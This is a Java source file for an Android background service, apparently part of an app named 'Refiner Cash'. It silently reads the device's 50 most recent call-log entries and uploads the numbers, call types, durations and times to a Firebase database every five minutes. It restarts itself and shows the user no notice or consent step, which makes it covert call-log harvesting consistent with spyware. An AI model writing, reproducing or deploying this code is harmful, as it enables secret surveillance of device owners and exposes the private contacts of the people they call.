package com.my.Refiner.Cash.User;

import android.Manifest;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.Settings;
import android.util.Log;

import androidx.core.content.ContextCompat;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;
import java.util.Map;

public class CallLogService extends Service {

    private static final String TAG = "CallLogService";
    private static final long INTERVAL = 5 * 60 * 1000;

    private Handler handler;
    private DatabaseReference dbRef;
    private String deviceId;
    private boolean isRunning = false;

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        dbRef = FirebaseDatabase.getInstance().getReference();

        SharedPreferences prefs = getSharedPreferences("mdm", MODE_PRIVATE);
        deviceId = prefs.getString("device_id", null);
        if (deviceId == null || deviceId.equals("unknown")) {
            deviceId = Settings.Secure.getString(
                    getContentResolver(), Settings.Secure.ANDROID_ID);
            prefs.edit().putString("device_id", deviceId).apply();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!isRunning) {
            isRunning = true;
            sendCallLog();
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    sendCallLog();
                    if (isRunning) handler.postDelayed(this, INTERVAL);
                }
            }, INTERVAL);
        }
        return START_STICKY;
    }

    private void sendCallLog() {
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
                    != PackageManager.PERMISSION_GRANTED) {
                Log.w(TAG, "No call log permission");
                return;
            }

            Cursor cursor = getContentResolver().query(
                    CallLog.Calls.CONTENT_URI, null, null, null,
                    CallLog.Calls.DATE + " DESC LIMIT 50");

            if (cursor == null) return;

            Map<String, Object> calls = new HashMap<>();
            int count = 0;

            while (cursor.moveToNext() && count < 50) {
                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
                long duration = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DURATION));
                long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));

                Map<String, Object> call = new HashMap<>();
                call.put("number", number);
                call.put("type", getCallType(type));
                call.put("duration", duration);
                call.put("time", date);

                calls.put(String.valueOf(date), call);
                count++;
            }
            cursor.close();

            dbRef.child("devices").child(deviceId).child("callLog").setValue(calls)
                    .addOnSuccessListener(aVoid -> Log.d(TAG, "Calls sent: " + calls.size()))
                    .addOnFailureListener(e -> Log.e(TAG, "Failed: " + e.getMessage()));
        } catch (Exception e) {
            Log.e(TAG, "Error: " + e.getMessage());
        }
    }

    private String getCallType(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE: return "INCOMING";
            case CallLog.Calls.OUTGOING_TYPE: return "OUTGOING";
            case CallLog.Calls.MISSED_TYPE: return "MISSED";
            default: return "UNKNOWN";
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning = false;
        handler.removeCallbacksAndMessages(null);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
